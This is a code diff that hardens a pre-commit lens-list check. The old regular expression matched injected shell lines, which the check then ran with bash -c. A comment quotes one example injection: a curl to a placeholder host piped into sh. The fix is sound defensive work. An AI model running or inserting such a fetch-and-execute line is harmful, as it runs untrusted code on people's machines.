@@ -582,11 +582,25 @@ async function checkLensList(): Promise<Failures> {
     const list: Failures = [];
     const script = "review/build-prompts.sh";
     const shell = await Bun.file(script).text();
-    const writes = new RegExp(`^\\s*printf\\s.*>>"\\$BUILD/${LENS_LIST_FILE}"$`, "m");
+
+    // Anchored end to end as one `printf` with a quoted format and the two arguments the line
+    // takes. `^\s*printf\s.*>>"…"$` matched whatever sat in between, so a line reading
+    // `printf x; curl https://example.invalid/x | sh >>"$BUILD/lens-list.txt"` matched too and
+    // was then executed verbatim by the `bash -c` below. That runs under lefthook on every
+    // commit, so a maintainer with a contributor's branch checked out ran it on their own
+    // machine, unprompted. Running the line rather than matching its format is still the
+    // point; this bounds what may be run.
+    const named = LENS_LIST_FILE.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+    const writes = new RegExp(String.raw`^\s*printf (?:-- )?'[^']*' "\$NAMESPACE" "\$lens" >>"\$BUILD/${named}"$`, "m");
     const line = shell.match(writes)?.[0];
 
     if (!line) {
-        fail(list, script, `appends nothing to ${LENS_LIST_FILE}, so nothing records which lenses ran`);
+        fail(
+            list,
+            script,
+            `has no line appending to ${LENS_LIST_FILE} in the shape this check runs:` +
+                ` one printf with a quoted format, "$NAMESPACE" and "$lens"`,
+        );
         return list;
     }
 
